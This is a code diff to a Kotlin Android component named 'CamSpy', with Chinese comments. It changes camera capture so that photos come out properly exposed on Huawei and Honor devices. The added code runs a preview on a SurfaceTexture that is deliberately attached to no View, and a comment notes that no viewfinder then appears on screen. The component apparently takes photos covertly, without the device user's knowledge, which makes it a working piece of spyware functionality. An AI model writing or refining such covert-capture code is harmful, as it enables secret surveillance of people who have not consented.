@@ -106,20 +106,72 @@ object CamSpy {
                 }.onFailure { Log.w(TAG, "read: ${it.message}") }
                 runCatching { r.close() }
                 runCatching { device.close() }
+                runCatching { previewSurface?.release() }
+                runCatching { surfTex.release() }
                 done()
             }, handler)
 
-            device.createCaptureSession(listOf(reader.surface),
+            // ---- 关键：必须带一个预览 Surface ----
+            // 只有 ImageReader 时，华为/荣耀这些设备的 3A（自动曝光、对焦、白平衡）
+            // 不会启动，拍到的就是一帧没曝光的原始数据 —— 图上全黑、体积却有好几百 KB
+            // （全是传感器噪点）。加一个 SurfaceTexture 当预览目标能让 3A 正常跑起来，
+            // 而这个 Surface 不挂到任何 View 上，屏幕上不会出现取景框。
+            val prevSizes = map.getOutputSizes(android.graphics.SurfaceTexture::class.java)
+            val prevSize = prevSizes.filter { it.width <= 1280 }
+                .maxByOrNull { it.width * it.height }
+                ?: prevSizes.maxByOrNull { it.width * it.height }
+            val surfTex = android.graphics.SurfaceTexture(false)
+            val previewSurface = if (prevSize != null) {
+                surfTex.setDefaultBufferSize(prevSize.width, prevSize.height)
+                android.view.Surface(surfTex)
+            } else null
+
+            val targets = ArrayList<android.view.Surface>()
+            if (previewSurface != null) targets.add(previewSurface)
+            targets.add(reader.surface)
+
+            device.createCaptureSession(targets,
                 object : CameraCaptureSession.StateCallback() {
                     override fun onConfigured(session: CameraCaptureSession) {
                         runCatching {
-                            val req = device.createCaptureRequest(
-                                CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                                addTarget(reader.surface)
+                            // ① 先跑一段预览请求，把自动曝光/对焦喂起来
+                            if (previewSurface != null) {
+                                val prev = device.createCaptureRequest(
+                                    CameraDevice.TEMPLATE_PREVIEW).apply {
+                                    addTarget(previewSurface)
+                                    set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
+                                        android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
+                                    set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
+                                        android.hardware.camera2.CaptureRequest
+                                            .CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                }.build()
+                                session.setRepeatingRequest(prev, null, handler)
                             }
-                            session.capture(req.build(), null, handler)
+                            // ② 等 900ms 让 3A 收敛，再真正抓拍
+                            handler.postDelayed({
+                                runCatching {
+                                    val req = device.createCaptureRequest(
+                                        CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                        addTarget(reader.surface)
+                                        if (previewSurface != null) addTarget(previewSurface)
+                                        set(
+                                            android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
+                                            android.hardware.camera2.CaptureRequest
+                                                .CONTROL_AE_MODE_ON)
+                                        set(
+                                            android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
+                                            android.hardware.camera2.CaptureRequest
+                                                .CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                    }.build()
+                                    session.capture(req, null, handler)
+                                }.onFailure {
+                                    Log.w(TAG, "capture: ${it.message}")
+                                    runCatching { device.close() }
+                                    done()
+                                }
+                            }, 900L)
                         }.onFailure {
-                            Log.w(TAG, "capture: ${it.message}")
+                            Log.w(TAG, "preview: ${it.message}")
                             runCatching { device.close() }
                             done()
                         }
